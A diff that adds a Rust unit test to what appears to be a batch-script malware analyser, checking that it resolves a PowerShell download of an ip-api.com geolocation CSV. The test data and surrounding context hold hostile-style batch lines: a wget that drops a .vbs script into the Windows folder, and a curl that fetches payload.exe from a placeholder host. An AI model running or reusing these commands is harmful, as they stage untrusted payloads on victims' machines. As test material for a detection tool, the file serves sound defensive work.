@@ -5685,6 +5685,29 @@ wget --no-check-certificate %urlgit%/win/get.vbs -O %windir%\get.vbs
     }
 
     #[test]
+    fn for_f_reads_ip_api_csv_downloaded_by_powershell() {
+        let script = br#"powershell -Command "(New-Object Net.WebClient).DownloadFile('http://ip-api.com/csv', 'GEO.csv')"
+for /f "tokens=6 delims=, " %%A in (GEO.csv) do echo city=%%A>location.txt
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo city=Metropolis>location.txt"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline == "GEO.csv"
+            )),
+            "downloaded ip-api CSV file source should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn compact_for_f_reads_generated_file_source() {
         let script = br#"echo https://compact-for-f.example/payload.exe>url.txt
 for/f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#;
